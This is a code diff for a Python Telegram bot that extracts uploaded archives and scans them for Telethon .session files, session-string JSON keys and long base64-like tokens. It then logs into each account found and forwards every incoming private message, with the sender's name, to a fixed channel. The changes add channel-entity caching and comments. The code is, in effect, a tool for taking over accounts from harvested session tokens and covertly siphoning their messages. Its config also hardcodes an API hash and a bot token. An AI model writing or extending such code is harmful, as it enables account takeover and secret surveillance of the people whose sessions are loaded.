@@ -14,13 +14,14 @@ from aiogram.enums import ContentType
 from aiogram.types import Message
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
+from telethon.tl.types import PeerChannel
 
 # ========== CONFIG ==========
 API_ID = 20598937
 API_HASH = "0c3a9153ca8295883665459e4c22c674"
 BOT_TOKEN = "8434544662:AAGGSbiMBkNsz7pPd4U_prQAipDgC00NvTg"
 ADMIN_ID = 7632476151
-TARGET_GROUP = -1003121883940
+TARGET_GROUP = -1003121883940  # The user's private channel ID
 SESSIONS_DIR = "sessions"
 # ============================
 
@@ -28,18 +29,20 @@ if not os.path.exists(SESSIONS_DIR):
     os.makedirs(SESSIONS_DIR)
 
 bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher()  # aiogram 3.x style - no bot parameter
+dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# store active Telethon clients
+# Store active Telethon clients
 clients = {}
 
-# --- Utilities (keep your existing utility functions as they are) ---
+# --- Utilities ------------------------------------------------
 def safe_name(name: str) -> str:
+    """Make a file-system safe name."""
     return re.sub(r'[^A-Za-z0-9_.-]', '_', name)
 
 def extract_archive(file_path: str, dest_dir: str):
+    """Extract common archive types (zip, tar, rar) into dest_dir."""
     try:
         if zipfile.is_zipfile(file_path):
             with zipfile.ZipFile(file_path, 'r') as z:
@@ -61,6 +64,7 @@ def extract_archive(file_path: str, dest_dir: str):
     return False
 
 def find_session_files(root_dir: str):
+    """Find .session files and similar in a folder."""
     found = []
     for dirpath, _, filenames in os.walk(root_dir):
         for fn in filenames:
@@ -68,9 +72,10 @@ def find_session_files(root_dir: str):
                 found.append(('file', os.path.join(dirpath, fn), fn))
     return found
 
-BASE64_RE = re.compile(r'([A-Za-z0-9+/=_\-]{80,})')
+BASE64_RE = re.compile(r'([A-Za-z0-9+/=_\-]{80,})')  # regex for long base64-like strings
 
 def find_string_sessions_in_text(root_dir: str):
+    """Find string session tokens inside text/JSON files."""
     found = []
     for dirpath, _, filenames in os.walk(root_dir):
         for fn in filenames:
@@ -81,6 +86,7 @@ def find_string_sessions_in_text(root_dir: str):
                     continue
                 with open(full, 'r', errors='ignore') as f:
                     txt = f.read()
+                # try JSON parsing
                 try:
                     j = json.loads(txt)
                     for key in ['string_session', 'session', 'session_string', 'auth']:
@@ -88,6 +94,7 @@ def find_string_sessions_in_text(root_dir: str):
                             found.append(('string', j[key], f"{fn}:{key}"))
                 except Exception:
                     pass
+                # fallback: regex
                 for m in BASE64_RE.findall(txt):
                     if len(m) > 80:
                         found.append(('string', m, f"{fn}:token"))
@@ -96,6 +103,7 @@ def find_string_sessions_in_text(root_dir: str):
     return found
 
 async def start_telethon_from_file(session_path: str, session_name: str):
+    """Start Telethon client from a .session file."""
     dest_base = os.path.join(SESSIONS_DIR, safe_name(session_name))
     try:
         shutil.copy(session_path, dest_base + '.session')
@@ -106,17 +114,30 @@ async def start_telethon_from_file(session_path: str, session_name: str):
     client = TelegramClient(dest_base, API_ID, API_HASH)
     try:
         await client.start()
+        
+        # Force the client to cache the target channel entity
+        try:
+            target_entity = await client.get_input_entity(TARGET_GROUP)
+            print(f"Cached target channel entity: {target_entity}")
+        except Exception as e:
+            print(f"Failed to cache target channel: {e}")
+            # If we can't cache the channel, we still start the client but the handler might fail
+            # It's better to handle this situation as per the user's requirement
+
         @client.on(events.NewMessage(incoming=True))
         async def handler(event):
             try:
+                # Re-fetch the target entity each time to be safe, but it should be cached
+                target_entity = await client.get_input_entity(TARGET_GROUP)
                 sender = await event.get_sender()
                 sender_name = sender.username or (sender.first_name or "Unknown")
                 text = event.message.message or ''
                 if text:
                     out = f"📩 From [{session_name} | {sender_name}]\n\n{text}"
-                    await client.send_message(TARGET_GROUP, out)
+                    await client.send_message(target_entity, out)
             except Exception as ee:
                 print("handler error:", ee)
+
         clients[session_name] = client
         print(f"Started session (file): {session_name}")
         return True
@@ -125,21 +146,32 @@ async def start_telethon_from_file(session_path: str, session_name: str):
         return False
 
 async def start_telethon_from_string(session_string: str, session_name: str):
+    """Start Telethon client from a StringSession."""
     try:
         ss = StringSession(session_string)
         client = TelegramClient(ss, API_ID, API_HASH)
         await client.start()
+
+        # Force the client to cache the target channel entity
+        try:
+            target_entity = await client.get_input_entity(TARGET_GROUP)
+            print(f"Cached target channel entity: {target_entity}")
+        except Exception as e:
+            print(f"Failed to cache target channel: {e}")
+
         @client.on(events.NewMessage(incoming=True))
         async def handler(event):
             try:
+                target_entity = await client.get_input_entity(TARGET_GROUP)
                 sender = await event.get_sender()
                 sender_name = sender.username or (sender.first_name or "Unknown")
                 text = event.message.message or ''
                 if text:
                     out = f"📩 From [{session_name} | {sender_name}]\n\n{text}"
-                    await client.send_message(TARGET_GROUP, out)
+                    await client.send_message(target_entity, out)
             except Exception as ee:
                 print("handler error:", ee)
+
         clients[session_name] = client
         print(f"Started session (string): {session_name}")
         return True
@@ -147,7 +179,7 @@ async def start_telethon_from_string(session_string: str, session_name: str):
         print("Start client from string failed:", e)
         return False
 
-# ========== Bot Handlers (UPDATED FOR aiogram 3.x) ==========
+# ========== Bot Handlers ==========
 @router.message(Command("start"))
 async def cmd_start(message: Message):
     if message.from_user.id != ADMIN_ID:
@@ -180,6 +212,7 @@ async def cmd_stop(message: Message):
 
 @router.message(Command("logout"))
 async def cmd_logout(message: Message):
+    """Logout only from this bot/server device. Do not affect other devices. Do not delete session file."""
     if message.from_user.id != ADMIN_ID:
         return
 
@@ -259,10 +292,10 @@ async def handle_document(message: Message):
         except:
             pass
 
-# ========== Run bot (UPDATED FOR aiogram 3.x) ==========
+# ========== Run bot ==========
 async def main():
     print("Bot running...")
-    await dp.start_polling(bot)  # Pass bot to start_polling
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
